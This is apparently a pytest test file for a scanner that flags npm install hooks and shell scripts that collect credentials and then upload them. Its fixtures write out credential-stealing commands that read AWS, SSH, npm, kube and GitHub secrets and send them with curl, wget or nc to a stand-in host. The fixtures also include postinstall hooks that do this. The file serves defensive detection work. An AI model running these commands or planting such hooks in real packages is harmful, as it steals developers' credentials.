"""ST-SECRET-EXFIL: npm install-time scripts, and shell scripts that collect a credential into a
file or variable and send it on a later line (the November 2026 CI / install-time stealers)."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from skilltotal.file_index import FileIndex
from skilltotal.scanners.secret_exfil import SecretExfilScanner, staged_upload_lines


def _staged(script: str) -> tuple[int, int] | None:
    return staged_upload_lines(script.splitlines())


@pytest.mark.parametrize(
    ("script", "expected"),
    [
        # Collected into a temp file, sent as curl's @file.
        ('out=$(mktemp)\ncat "$HOME/.aws/credentials" >> "$out"\n'
         'curl -s --data-binary @"$out" https://c.example.invalid/x\n', (2, 3)),
        # The whole environment into a file, sent through a pipe.
        ("env > /tmp/e.txt\ncat /tmp/e.txt | curl -d @- https://c.example.invalid\n", (1, 2)),
        # Into a variable, posted by wget.
        ('creds="$(cat ~/.npmrc)"\nwget --post-data="$creds" https://c.example.invalid\n', (1, 2)),
        # Braced variable and an upload option.
        ("k=`cat ~/.ssh/id_rsa`\ncurl -F \"f=${k}\" https://c.example.invalid\n", (1, 2)),
        # A file fed to netcat on stdin, with tee as the writer.
        ("cat ~/.kube/config | tee -a /tmp/k\nnc c.example.invalid 80 < /tmp/k\n", (1, 2)),
        # A login token sent to a host that is not the provider's.
        ('t="$(gh auth token)"\ncurl -d "t=$t" https://c.example.invalid\n', (1, 2)),
    ],
)
def test_collected_then_sent_is_found(script, expected):
    assert _staged(script) == expected


@pytest.mark.parametrize(
    "script",
    [
        # A token used as a header authenticates; it is not sent as data.
        'T="$(gh auth token)"\ncurl -H "Authorization: Bearer $T" https://c.example.invalid\n',
        # A provider's token sent to that provider is its use.
        't="$(gh auth token)"\ncurl -d "t=$t" https://api.github.com/x\n',
        # The send comes before the read.
        'curl -d @"$out" https://c.example.invalid\ncat ~/.aws/credentials >> "$out"\n',
        # Written to /dev/null, nothing is kept.
        "cat ~/.aws/credentials > /dev/null\ncurl -T /dev/null https://c.example.invalid\n",
        # A file that never held a credential.
        "npm run build > build.log 2>&1\ncurl -T build.log https://c.example.invalid\n",
        # Commented out.
        '# cat ~/.aws/credentials >> "$out"\ncurl --data-binary @"$out" https://c.example.invalid\n',
        # A credential path written to, not read (the redirect is before the path).
        'echo "//registry/:_authToken=x" > ~/.npmrc\ncurl -T ~/.npmrc.bak https://c.example.invalid\n',
        # A different name that only starts the same.
        'cat ~/.aws/credentials > "$out"\ncurl --data-binary @"$output" https://c.example.invalid\n',
    ],
)
def test_not_a_staged_send(script):
    assert _staged(script) is None


def _scan(tmp_path: Path, scripts: dict, files: dict[str, str]):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0", "scripts": scripts}), encoding="utf-8")
    for rel, text in files.items():
        p = tmp_path / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
    return SecretExfilScanner().scan(FileIndex.build(tmp_path)).findings


def test_inline_install_command_that_uploads_a_credential(tmp_path):
    hook = {"postinstall": "cat ~/.npmrc | curl -d @- https://c.example.invalid"}
    findings = _scan(tmp_path, hook, {})
    assert [e.file for f in findings for e in f.evidence] == ["package.json"]


def test_install_script_that_collects_then_sends(tmp_path):
    findings = _scan(tmp_path, {"postinstall": "sh ./.ci-abc123.sh"}, {
        ".ci-abc123.sh": 'o=$(mktemp)\ncat "$HOME/.aws/credentials" >> "$o"\n'
                         'curl --data-binary @"$o" https://c.example.invalid\n',
    })
    (ev,) = [e for f in findings for e in f.evidence]
    assert (ev.file, ev.line_start, ev.line_end) == (".ci-abc123.sh", 2, 3)


def test_far_apart_lines_point_at_the_send(tmp_path):
    body = 'cat ~/.aws/credentials > "$o"\n' + "echo step\n" * 10 + 'curl -d @"$o" https://c.example.invalid\n'
    findings = _scan(tmp_path, {"preinstall": "bash scripts/setup.sh"}, {"scripts/setup.sh": body})
    (ev,) = [e for f in findings for e in f.evidence]
    assert (ev.line_start, ev.line_end) == (12, 12)


def test_script_not_run_at_install_is_not_read(tmp_path):
    findings = _scan(tmp_path, {"test": "sh ./steal.sh"}, {
        "steal.sh": 'cat ~/.aws/credentials > "$o"\ncurl -d @"$o" https://c.example.invalid\n',
    })
    assert findings == []


def test_install_script_using_its_token_as_a_header_is_clean(tmp_path):
    findings = _scan(tmp_path, {"postinstall": "sh scripts/fetch.sh"}, {
        "scripts/fetch.sh": 'T="$(gh auth token)"\n'
                            'curl -H "Authorization: Bearer $T" -o bin/t https://api.github.com/x\n',
    })
    assert findings == []
